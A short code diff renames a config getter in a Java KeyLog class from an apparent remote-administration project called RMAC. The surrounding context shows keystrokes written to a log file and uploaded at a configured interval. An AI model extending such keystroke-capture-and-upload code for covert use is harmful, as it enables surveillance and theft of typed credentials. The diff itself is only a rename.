@@ -52,7 +52,7 @@ public class KeyLog implements Runnable {
     this.keyLogFile = new File(Constants.KEYLOG_LOCATION);
     this.buffer = new ArrayList<>();
 
-    if (RMAC.config.getKeyLogging()) {
+    if (RMAC.config.getKeyLog()) {
       openFileWriter();
     } else {
       writer = new PrintWriter(new NoopOutputStream());
@@ -157,7 +157,7 @@ public class KeyLog implements Runnable {
         Thread.sleep(RMAC.config.getKeyLogUploadInterval());
 
         // If key-logging is disabled via config, no need to upload
-        if (!RMAC.config.getKeyLogging()) {
+        if (!RMAC.config.getKeyLog()) {
           continue;
         }
 
